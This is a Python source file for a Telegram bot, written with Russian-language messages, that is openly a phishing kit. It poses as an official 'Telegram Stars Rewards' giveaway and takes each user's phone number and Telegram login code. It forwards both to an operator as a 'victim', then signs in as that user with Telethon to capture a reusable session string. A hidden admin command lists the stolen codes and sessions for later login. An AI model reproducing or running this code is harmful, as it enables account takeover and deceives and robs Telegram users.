import os
from telebot import TeleBot, types
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

bot = TeleBot(BOT_TOKEN)
victims = {}  # phone → data

print("[+] PHANTOM FULL FISHING STARTED - vFINAL")

# ====================== СТАРТ ======================
@bot.message_handler(commands=['start'])
def start(message):
    print(f"[LOG] /start от {message.from_user.id}")
    text = """🌟 <b>Добро пожаловать в официальный Telegram Stars Rewards Center 2026!</b>

🎁 Специальная акция — получай Stars бесплатно за подключение аккаунта!

✅ Почему это безопасно:
• Официальное API Telegram
• Полная защита данных
• Мгновенное начисление
• Ежедневные бонусы и розыгрыши

💰 Что ты получишь сразу:
• 3500–6000 Stars на баланс
• Обмен на TON, USDT, NFT
• Участие в закрытых дропах

Нажми кнопку ниже и получи Stars за 30 секунд 👇"""

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚀 Подключить аккаунт и получить Stars", callback_data="connect"))
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

# ====================== КНОПКА ПОДКЛЮЧЕНИЯ ======================
@bot.callback_query_handler(func=lambda call: call.data == "connect")
def connect(call):
    print(f"[LOG] Кнопка connect нажата {call.from_user.id}")
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("📱 Отправить мой контакт", request_contact=True))
    
    bot.send_message(call.message.chat.id, 
        "📱 Чтобы получить Stars, отправь свой контакт одной кнопкой ниже:", 
        reply_markup=markup)

# ====================== ОБРАБОТКА КОНТАКТА ======================
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    if not message.contact or not message.contact.phone_number:
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    print(f"[+] КОНТАКТ ПОЛУЧЕН: {phone} от {message.from_user.id}")

    victims[phone] = {"code": None, "name": message.contact.first_name or "Unknown"}

    bot.send_message(ADMIN_ID, f"🌟 НОВАЯ ЖЕРТВА!\n📱 Номер: {phone}\n👤 Имя: {victims[phone]['name']}")

    bot.send_message(message.chat.id, 
        f"✅ Контакт принят: <b>{phone}</b>\n\nТеперь введи код подтверждения, который пришёл тебе в Telegram или SMS:", 
        parse_mode='HTML')

    # Ждём код именно от этого пользователя
    bot.register_next_step_handler(message, wait_for_code, phone)

# ====================== ОБРАБОТКА КОДА ======================
def wait_for_code(message, phone):
    code = message.text.strip()
    print(f"[+] КОД ВВЕДЁН: {phone} → {code}")

    victims[phone]["code"] = code

    # Уведомление тебе
    bot.send_message(ADMIN_ID, f"""🔥 КОД ОТ ЖЕРТВЫ!
📱 Номер: {phone}
🔑 Код: {code}
👤 Имя: {victims[phone]['name']}""")

    # Авто-создание сессии
    asyncio.run(create_session(phone, code))

    # Ответ жертве
    bot.send_message(message.chat.id, """🎉 <b>Аккаунт успешно подключён!</b>

На ваш баланс мгновенно начислено <b>4750 Stars</b>! 🎁

Теперь ты можешь тратить их на мини-приложения, стикеры и обменивать на TON.

Спасибо за участие в программе Telegram Stars Rewards!""", parse_mode='HTML')

async def create_session(phone, code):
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(phone, code)
        session_string = client.session.save()
        me = await client.get_me()

        victims[phone]["session_string"] = session_string
        victims[phone]["first_name"] = me.first_name
        victims[phone]["username"] = me.username

        await bot.send_message(ADMIN_ID, f"✅ Сессия создана для {phone}\nИмя: {me.first_name}")
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"⚠️ Сессия не создана для {phone}\nОшибка: {e}")
    finally:
        await client.disconnect()

# ====================== СЕКРЕТНАЯ КОМАНДА ======================
@bot.message_handler(commands=['adminwork'])
def adminwork(message):
    print(f"[LOG] /adminwork от {message.from_user.id}")
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "Доступ запрещён.")
        return

    if not victims:
        bot.send_message(message.chat.id, "Пока нет пойманных аккаунтов.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    for phone in victims:
        short = phone[-8:]
        markup.add(
            types.InlineKeyboardButton(f"🔑 Код {short}", callback_data=f"code:{phone}"),
            types.InlineKeyboardButton(f"📄 Session {short}", callback_data=f"file:{phone}"),
            types.InlineKeyboardButton(f"👁 Инфо {short}", callback_data=f"info:{phone}")
        )

    text = f"🔥 PHANTOM ADMIN PANEL\nПоймано: {len(victims)} аккаунтов"
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.from_user.id != ADMIN_ID:
        return
    action, phone = call.data.split(":", 1)
    data = victims.get(phone)
    if not data:
        bot.send_message(call.message.chat.id, "Аккаунт не найден.")
        return

    if action == "file":
        session = data.get("session_string")
        if session:
            bot.send_message(call.message.chat.id, f"📄 StringSession для {phone}:\n\n<code>{session}</code>\n\nСкопируй и используй в login.py", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "Сессия ещё не создана.")
    elif action == "code":
        code = data.get("code") or "Ещё не ввели"
        bot.send_message(call.message.chat.id, f"🔑 Код для {phone}: {code}")
    elif action == "info":
        bot.send_message(call.message.chat.id, f"👁 {phone}\nИмя: {data.get('first_name', '—')}\nUsername: @{data.get('username', 'нет')}")

print("[+] Большой фишинг-кит готов. Запущен.")
bot.infinity_polling(none_stop=True)
